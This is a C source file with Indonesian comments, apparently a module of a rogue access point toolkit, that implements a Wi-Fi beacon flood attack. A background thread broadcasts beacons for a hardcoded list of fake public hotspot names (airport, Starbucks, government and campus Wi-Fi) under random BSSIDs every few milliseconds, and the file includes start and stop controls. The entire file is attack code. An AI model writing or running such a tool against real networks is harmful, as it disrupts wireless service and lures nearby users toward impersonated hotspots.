// ============================================================================
// IMPLEMENTASI: attack/beacon_flood.c — Generator Beacon Banjir Multi-SSID
// ============================================================================
#include "beacon_flood.h"
#include "../core/rogue_ap.h"
#include "../utils/utils.h"
#include "../utils/logger.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>

static volatile bool g_flood_running = false;
static pthread_t g_flood_tid;

// Daftar SSID bawaan untuk membanjiri spektrum
static const char *default_ssids[] = {
    "Free_WiFi_Zone", "Airport_Guest", "Starbucks_Public", "Hotel_Lobby_Fast",
    "Cafe_Corner_5G", "Mall_Free_Internet", "Telkom_Hotspot", "Gov_Public_WiFi",
    "Undisclosed_Network", "SecureNet_Open", "MegaSpeed_WiFi", "Guest_Access_Point",
    "WiFi_Gratis_Warkop", "Resto_Free_Connect", "Stasiun_Kereta_WiFi", "Kampus_Mahasiswa"
};

typedef struct {
    char iface[16];
    int channel;
    int count;
} flood_config_t;

/*
 * === FUNGSI: flood_worker() ===
 * Tujuan   : Thread pemancar beacon bergantian memancarkan SSID palsu
 */
static void *flood_worker(void *arg) {
    flood_config_t *fc = (flood_config_t*)arg;
    ap_config_t ap_cfg = {0};
    strncpy(ap_cfg.ap_iface, fc->iface, sizeof(ap_cfg.ap_iface) - 1);
    ap_cfg.channel = fc->channel;

    log_event(LOG_INFO, "Beacon Flood aktif: Memancarkan %d SSID di Channel %d",
              fc->count, fc->channel);

    int num_presets = sizeof(default_ssids) / sizeof(default_ssids[0]);

    while (g_flood_running) {
        for (int i = 0; i < fc->count && g_flood_running; i++) {
            get_random_mac(ap_cfg.bssid); // Tiap SSID menggunakan BSSID acak unik
            const char *ssid = default_ssids[i % num_presets];
            send_beacon_with_ssid(&ap_cfg, ssid);
            usleep(2000); // 2 ms antar beacon
        }
        usleep(50000);    // 50 ms antar siklus putaran
    }

    free(fc);
    log_event(LOG_INFO, "Beacon Flood berhenti");
    return NULL;
}

/*
 * === FUNGSI: beacon_flood_start() ===
 * Tujuan   : Meluncurkan serangan beacon flood di latar belakang
 */
int beacon_flood_start(const char *iface, int channel, int count) {
    if (g_flood_running) return 0;

    flood_config_t *fc = malloc(sizeof(flood_config_t));
    if (!fc) return -1;
    strncpy(fc->iface, iface, sizeof(fc->iface) - 1);
    fc->channel = channel;
    fc->count = count > 64 ? 64 : count;

    g_flood_running = true;
    // FIX #4: Periksa nilai return pthread_create
    if (pthread_create(&g_flood_tid, NULL, flood_worker, fc) != 0) {
        log_event(LOG_ERROR, "Gagal membuat pthread beacon flood");
        g_flood_running = false;
        free(fc);
        return -1;
    }
    return 0;
}

/*
 * === FUNGSI: beacon_flood_stop() ===
 * Tujuan   : Menghentikan serangan beacon flood dan menunggu thread selesai
 */
void beacon_flood_stop(void) {
    if (!g_flood_running) return;
    g_flood_running = false;
    pthread_join(g_flood_tid, NULL);
}
